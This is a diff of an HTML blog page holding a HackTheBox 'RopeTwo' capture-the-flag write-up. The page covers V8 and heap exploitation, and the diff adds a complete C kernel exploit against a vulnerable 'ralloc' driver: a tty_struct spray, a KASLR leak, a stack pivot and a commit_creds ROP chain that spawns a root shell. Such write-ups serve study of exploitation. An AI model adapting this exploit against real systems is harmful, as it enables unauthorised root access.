@@ -430,7 +430,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-01-18
                 </div>
                 
 
@@ -465,7 +465,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I’ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let’s start.</p>
-<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-</p>
+<h3 id="Foothold-V8-Exploiation"><a href="#Foothold-V8-Exploiation" class="headerlink" title="Foothold: V8 Exploiation"></a>Foothold: V8 Exploiation</h3><p>So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-</p>
 <pre class=" language-r"><code class="language-r">➜ ✔ nmap <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>A <span class="token number">10.10</span>.<span class="token number">10.196</span>
 Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">-</span><span class="token number">16</span> <span class="token number">21</span><span class="token operator">:</span><span class="token number">57</span> IST
 Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.<span class="token number">10.196</span>
@@ -514,8 +514,8 @@ d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:<
 <blockquote>
 <p>Attachment: The <code>d8</code> binary and the exploits can be found here: <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold" target="_blank" rel="noopener">https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold</a></p>
 </blockquote>
-<h5 id="Obstacle-Pointer-Compression"><a href="#Obstacle-Pointer-Compression" class="headerlink" title="Obstacle: Pointer Compression"></a>Obstacle: Pointer Compression</h5><p>The only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this <a href>blog</a>, this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get <code>fakeobj</code> and the <code>addrof</code> primitive, then we can get through the pointer compression which would result in not being a problem.</p>
-<h5 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h5><p>First of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-</p>
+<p>The only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this <a href>blog</a>, this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get <code>fakeobj</code> and the <code>addrof</code> primitive, then we can get through the pointer compression which would result in not being a problem.</p>
+<p>First of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-</p>
 <pre class=" language-diff"><code class="language-diff">~/Pwning/HackTheBox/htb-rope2 $ cat patch.diff 
 diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
 index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644
@@ -1095,7 +1095,8 @@ uid<span class="token operator">=</span><span class="token number">1000</span><s
 chromeuse</code></pre>
 <p>Knowing the author, I assumed this <code>rshell</code> binary is going to be about binary exploitation, this meant it was time to transfer it to the machine of mine and start to dissect it to know the flow of it.</p>
 <hr>
-<h5 id="main-function"><a href="#main-function" class="headerlink" title="main function"></a><code>main</code> function</h5><pre class=" language-C"><code class="language-C">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+<p> <code>main</code> function</p>
+<pre class=" language-C"><code class="language-C">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 {
   int v3; // [rsp+Ch] [rbp-D4h]
   char s[200]; // [rsp+10h] [rbp-D0h]
@@ -1179,7 +1180,8 @@ chromeuse</code></pre>
 </blockquote>
 <p>Seeing this, when we do <code>ls</code>, it calls <code>print_directory</code> which showed the list of allocated files, then for <code>add</code>, <code>edit</code> and <code>rm</code> it calls their respective functions and the last one being the <code>id</code> which just prints the string <code>uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)</code>, so this was doing nothing,</p>
 <hr>
-<h5 id="add-function"><a href="#add-function" class="headerlink" title="add function"></a><code>add</code> function</h5><p>This function was responsible for handling the workflow of adding new files:-</p>
+<p> <code>add</code> function</p>
+<p>This function was responsible for handling the workflow of adding new files:-</p>
 <pre class=" language-C"><code class="language-C">unsigned __int64 __fastcall add(const char *a1)
 {
   size_t size; // [rsp+1Ch] [rbp-14h]
@@ -1241,7 +1243,8 @@ chromeuse</code></pre>
 <li>The number of chunks(files) we can add is 2 at most.</li>
 <li>The size accepted for the chunk allocation is restricted to the 0x78, for which we can safely assume we will deal with tcache.</li>
 </ul>
-<h5 id="rm-function"><a href="#rm-function" class="headerlink" title="rm function"></a><code>rm</code> function</h5><p>The <code>rm</code> function which was responsible for removing chunks(files) from the binary was handled by this function:-</p>
+<p> <code>rm</code> function</p>
+<p>The <code>rm</code> function which was responsible for removing chunks(files) from the binary was handled by this function:-</p>
 <pre class=" language-C"><code class="language-C">unsigned __int64 __fastcall remove(const char *a1)
 {
   int i; // [rsp+14h] [rbp-Ch]
@@ -1324,7 +1327,8 @@ chromeuse</code></pre>
 <li>Attempt to read into that extended chunk with the new data we wanted to store.</li>
 </ul>
 <hr>
-<h5 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h5><p>The cue for this binary was the <code>edit</code>, pretty expected coming from heap challenge, for most part the vulnerability always seem to have in <code>edit</code> functionality provided by the binary. In this case, the vulerability arises from the use of the function <code>realloc</code>, for this if we refer to man pages, we can see how this was the point of the vulnerability:-</p>
+<p><strong>Vulnerability</strong></p>
+<p>The cue for this binary was the <code>edit</code>, pretty expected coming from heap challenge, for most part the vulnerability always seem to have in <code>edit</code> functionality provided by the binary. In this case, the vulerability arises from the use of the function <code>realloc</code>, for this if we refer to man pages, we can see how this was the point of the vulnerability:-</p>
 <blockquote>
 <p> The  realloc() function changes the size of the memory block pointed to<br> by ptr to size bytes.  The contents will be unchanged in the range from<br> the start of the region up to the minimum of the old and new sizes.  If<br> the new size is larger than the old size, the added memory will not  be<br> initialized.   If  ptr  is  NULL,  then  the call is equivalent to mal‐<br> loc(size), for all values of size; if size is equal to zero, and ptr is<br> not  NULL,  then  the  call  is equivalent to free(ptr).  Unless ptr is<br> NULL, it must have been returned by an earlier call to  malloc(),  cal‐<br> loc(),  or realloc().  If the area pointed to was moved, a free(ptr) is<br> done.</p>
 </blockquote>
@@ -1503,7 +1507,7 @@ p.interactive()</code></pre>
 <p>Issue, after getting the shell as the user <code>r4j</code>, I couldn’t read the <code>user.txt</code> which was because of the groups I belonged, using the <code>newgrp</code> and leveraging to the <code>r4j</code> group, I was able to read the user flag.</p>
 </blockquote>
 <p><img src="/img/ropetwo/user.png" alt></p>
-<h1 id="Root-Kernel-Exploitation"><a href="#Root-Kernel-Exploitation" class="headerlink" title="Root: Kernel Exploitation"></a>Root: Kernel Exploitation</h1><p>Now, being the user <code>r4j</code> didn’t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>. </p>
+<h3 id="Root-Kernel-Exploitation"><a href="#Root-Kernel-Exploitation" class="headerlink" title="Root: Kernel Exploitation"></a>Root: Kernel Exploitation</h3><p>Now, being the user <code>r4j</code> didn’t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>. </p>
 <blockquote>
 <p>Attachment: The files for root exploitation can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root" target="_blank" rel="noopener">here</a>.</p>
 </blockquote>
@@ -1513,7 +1517,9 @@ p.interactive()</code></pre>
 <pre class=" language-C"><code class="language-C">Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
 <p>There was no publically available CVE for this version of kernel, what left was to dissect the binary and try to understand the workflow and look for any vulnerable part. I am more fan of IDA than of Ghidra, but then again it’s just personal preference, at the end you’ll have the overall idea. So, moving on, let’s reverse engineer the binary and see what the binary really does:-</p>
 <p>Now, using the <code>IDA</code> and cleaning up the code a lot, there were 3 functions, in which the <code>rope2_ioctl</code> was one of the functions which was most interesting, the other 2 being <code>rope2_init</code> and <code>rope2_exit</code> are there to handle the intialization and exit operation for the modules, aside from those, the function we need to really focus on was the <code>rope2_ioctl</code> which was as follows:-</p>
-<p>First off, there were four options one could invoke, which were as follows:-</p>
+<blockquote>
+<p>The development of the exploit is done on the QEMU instance which can be foind at the above attached link.<br>KASLR has been off for the debugging purpose but it is enabled on the RopeTwo machine.<br>First off, there were four options one could invoke, which were as follows:-</p>
+</blockquote>
 <pre class=" language-C"><code class="language-C">    case 0x1000:
       heap.size = *&request.size;
       if ( *&request.size <= 0x400uLL && request.index <= 0x1F )
@@ -1671,6 +1677,9 @@ void get(int fd, unsigned long idx, unsigned long size, char *ptr)
  }
 }
 </code></pre>
+<blockquote>
+<p>The <code>*.cpio</code> file could be compiled with <code>find . | cpio -H newc -ov -F ../initramfs.cpio</code></p>
+</blockquote>
 <p>For the experimentation, I made a QEMU instance of the Linux Kernel <code>5.0.-38</code> with the <code>ralloc.ko</code> as a module loaded to it upon starting, which I uploaded to the github, linked above, try it yourself. </p>
 <p>The question we end up at last at exactly how are we supposed to exploit this heap overflow which only gives us the extra 32 bytes to do read/write. Upon the extensive research, I found <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#tty_struct" target="_blank" rel="noopener">this blog post</a> by <a href="https://twitter.com/ptr-yudai" target="_blank" rel="noopener">ptr-yudai</a>, which if translated to the english stated as follows:-</p>
 <hr>
@@ -1782,8 +1791,243 @@ int main() {
 }</code></pre>
 <p>Doing the above, we get the RIP overwritten as <code>0xdeadbeef</code>.</p>
 <p><img src="/img/ropetwo/deadbeef.png" alt></p>
-<p>I used the <code>tty_struct</code> as the allocation function of the <code>ralloc</code> device had a 32 byte overflow to the heap region which allowed me to overwrite the <code>ptm_unix98_ops</code> and replace it with a crafted <code>tty_struct</code>, hence, I overwrote the RIP with the <code>xchg eax, esp</code> and <code>mmap</code>‘d a chunk shared between the region, which had the payload stored, which did <code>prepare_kernel_cred(commit_cred(0))</code> which would leverage the privileges to the root and calling a userland function which did <code>system(&quot;/bin/sh&quot;)</code>, compiling the exploit as <code>gcc -static -masm=intel xploit.c -o xploit</code> .</p>
+<p>Now, moving on, we will have to somehow execute the ROP chain which will be <code>commit_creds(init_creds())</code>, and call a function which will spawn shell. As for my initial research, I found out that we can use a gadget like <code>xchg eax, esp</code> and <code>mmap</code> a memory region with the lower 32 bit address of the gadget and store our ROP chain to it, which once the RIP hits the gadget, would exchange the <code>eax</code> and <code>esp</code> would execute instructions from the <code>mmap</code>‘d region. To do this, I change the 12th index of the <code>fake_tty_operations</code> to the address of the <code>xchg eax, esp</code> gadget and set a breakpoint at the address within gdb:</p>
+<blockquote>
+<p>The gadget was found with the help of ROPGadget and is from the <code>.text</code> section because of r/w permissions. `</p>
+</blockquote>
+<pre class=" language-C"><code class="language-C">  fake_tty_operations[12] = kbase + 0x4cba4;
+  buf[131] = &fake_tty_operations;
+
+  fill(fd, 0, 0x420, &buf);
+  for(int i=0; i<0x100; i++)</code></pre>
+<p><img src="/img/ropetwo/gadget.png" alt></p>
+<p>If we step into the instruction and see the values of both <code>eax</code> &amp; <code>esp</code>, we will see:-</p>
+<p><img src="/img/ropetwo/esp.png" alt></p>
+<p>As seen above, the <code>rsp</code> is now pointing to the loweer 32 bit address of the gadget, now, we can <code>mmap</code> a shared memory page such that it’ll be accessible between the kernel and the userland space with:-</p>
+<pre class=" language-C"><code class="language-C">void *mapped = mmap(pivot_target & 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0);</code></pre>
+<p>Now, time to craft a ROP chain which will be stored in the shared memory region, following is the ROP chain I created:-</p>
+<pre class=" language-C"><code class="language-C">  unsigned long long user_rflags, user_cs, user_ss, user_sp;
+    asm volatile(
+        "mov %0, %%cs\n"
+        "mov %1, %%ss\n"
+        "mov %2, %%rsp\n"
+        "pushfq\n"
+        "pop %3\n"
+        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
+    );
+
+    unsigned long long rop[] = {
+         pop_rdi, // pop rdi
+         init_creds,
+         commit_creds,
+         swapgs,
+         0xdeadbeef,
+         iretq,
+         get_shell,
+         user_cs,
+         user_rflags,
+         user_sp,
+        user_ss,
+    };</code></pre>
+<p>Now, to explain the ROP chain, let’s break down:-</p>
+<ul>
+<li><code>pop rdi; ret</code> this will pop the <code>rdi</code> register which is responsible for holding the 1st arguument in the x86_64 systems.</li>
+<li><code>init_creds</code>: This will be given into the <code>rdi</code>.</li>
+<li><code>commit_creds</code>, doing so, when the the RIP will reach the <code>commit_creds</code>, it’ll execute it as <code>commit_creds(init_creds())</code> which will change the <code>UID</code> for the running process to <code>0</code>.</li>
+<li>Then, <code>swapgs</code> will let the it back to the userland safely because of the SMAP and KASLR being enabled, then <code>0xdeadbeef</code> for the padding.</li>
+<li><code>iretq</code> will store the the flags and register and the RIP.</li>
+<li>Followed by the <code>get_shell</code> function, this will be the RIP.</li>
+<li>Rest flags would be restored and will be considered.</li>
+</ul>
+<p>Now, the final exploit looks like this:-</p>
+<pre class=" language-C"><code class="language-C">#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/wait.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include<linux/userfaultfd.h>
+#include <sys/timerfd.h>
+#include <pthread.h>
+#include <poll.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+
+unsigned long kbase, kheap;
+unsigned long ptm_unix98_ops = 0x10af6a0;
+unsigned long pop_rdi, kpti;
+unsigned long init_creds = 0x165fa00;
+unsigned long commit_creds = 0xc0540;
+
+void *fake_tty_operations[30];
+
+int spray_fd[0x100];
+
+struct message {
+  unsigned int index;
+  long size;
+  char *buf;
+};
+
+
+void kmalloc(int fd, unsigned long idx, unsigned long size)
+{
+  struct message msg;
+  msg.size = size;
+  msg.index = idx;
+  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
+  if (ioctl(fd, 0x1000, &msg) == -1)
+  {
+   puts("Error!!");
+   exit(1);
+  }
+}
+
+void kfree(int fd, unsigned long idx)
+{
+ struct message msg;
+ msg.index = idx;
+ printf("[*] Free'ng index: %ld\n", idx);
+ if (ioctl(fd, 0x1001, &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+
+void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
+{
+ struct message msg;
+ msg.buf = ptr;
+ msg.index = idx;
+ msg.size = size;
+ printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
+ if (ioctl(fd, 0x1002,  &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+
+
+void get(int fd, unsigned long idx, unsigned long size, char *ptr)
+{
+ struct message msg;
+ msg.index = idx;
+ msg.size = size;
+ msg.buf = ptr;
+ printf("[*] Reading data from index: %ld\n", idx);
+   if (ioctl(fd, 0x1003, &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+
+void get_shell()
+{
+    printf("is system?\n");
+    char *shell = "/bin/sh";
+    char *args[] = {shell, NULL};
+    execve(shell, args, NULL);
+}
+
+
+
+int main() {
+  unsigned long buf[0x420 / sizeof(unsigned long)];
+  /* open drivers */
+  int fd = open("/dev/ralloc", O_RDONLY);
+  if (fd < 0) {
+    perror("/dev/ralloc");
+    return 1;
+  }
+
+  for(int i=0; i<0x100; i++)
+ {
+   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+ }
+
+  /* leak kbase & kheap */
+  //int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+  kmalloc(fd, 0, 0x400);
+  get(fd, 0, 0x420, &buf);
+  kbase = buf[131] - ptm_unix98_ops;
+  buf[19] = 0xdeadbeef;
+
+  printf("[*] Leak                :   %p\n", buf[131]);
+  printf("[*] Base                :   %p\n", kbase);
+  printf("[*] Gadget              :   %p\n", kbase + 0xb55c7);
+  commit_creds = kbase + commit_creds;
+  init_creds = kbase + init_creds;
+  pop_rdi = kbase + 0x8b8a0;      // pop rdi; ret
+  unsigned long mov_rdi_rax = kbase + 0xffffffff813153bc - 0xffffffff81000000;
+  printf("[*] init_creds:   %p\n", init_creds);
+  printf("[*] commit_creds        :   %p\n", commit_creds);
+  printf("[*] get_shell            :   %p\n", &get_shell);
+  printf("[!] DEBUG....:");
+  getchar();
+  fake_tty_operations[12] = kbase + 0x4cba4;
+  buf[131] = &fake_tty_operations;
+
+
+  unsigned long iretq = kbase + 0xffffffff810379fb - 0xffffffff81000000;
+  unsigned long swapgs = kbase + 0xffffffff81074b54 - 0xffffffff81000000;
+  unsigned long pivot_target = kbase + 0x4cba4 & 0xffffffff;
+  unsigned long *fake_stack = &pivot_target;
+  void *mapped = mmap(pivot_target & 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0);
+  printf("mmap'd chunk:       %p\n", mapped);
+  printf("pivot_target:       %p\n", pivot_target);
+
+  unsigned long prepare_kernel_creds = kbase + 0xc07a0;
+  unsigned long long user_rflags, user_cs, user_ss, user_sp;
+    asm volatile(
+        "mov %0, %%cs\n"
+        "mov %1, %%ss\n"
+        "mov %2, %%rsp\n"
+        "pushfq\n"
+        "pop %3\n"
+        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
+    );
+
+  unsigned long long rop[] = {
+         pop_rdi, // pop rdi
+         init_creds,
+         commit_creds,
+         swapgs,
+         0xdeadbeef,
+         iretq,
+         get_shell,
+         user_cs,
+         user_rflags,
+         user_sp,
+        user_ss,
+    };
+ memcpy((void *)(kbase + 0x4cba4 & 0xffffffff), rop, sizeof(rop));
+ puts("[*] Finished writing rop chain to mmap'd page");
+
+  fill(fd, 0, 0x420, &buf);
+  for(int i=0; i<0x100; i++)
+  {
+      ioctl(spray_fd[i], 0, 0);
+  }
+  return 0;
+}</code></pre>
+<p>Repacking the <code>initramfs.cpio</code> with the compiled exploit and running it:-</p>
+<blockquote>
+<p>Compile it with the <code>gcc -static -masm=intel xpl.c -o xpl</code></p>
+</blockquote>
+<p><img src="/img/ropetwo/rop.png" alt></p>
+<p>Now continuing the execution, we will get <code>root</code> on the QEMU instace.</p>
+<p><img src="/img/ropetwo/qemu_root.png" alt></p>
+<p>Now, the exploit is ready, bear in mind the exploit is not very reliable like of those standard exploit one can compile, run and poof, root. For the one I created, I had to reset the machine quite few times, but after some tries, I got the root:-</p>
+<blockquote>
+<p>The reason I ran the exploit as <code>chromeuser</code> to get <code>root</code> is because the LKM was accessible with the both <code>r4j</code> and <code>chromeuser</code>.</p>
+</blockquote>
 <p><img src="/img/ropetwo/root.png" alt></p>
+<p>Thank you!!!</p>
 
                 
             </div>
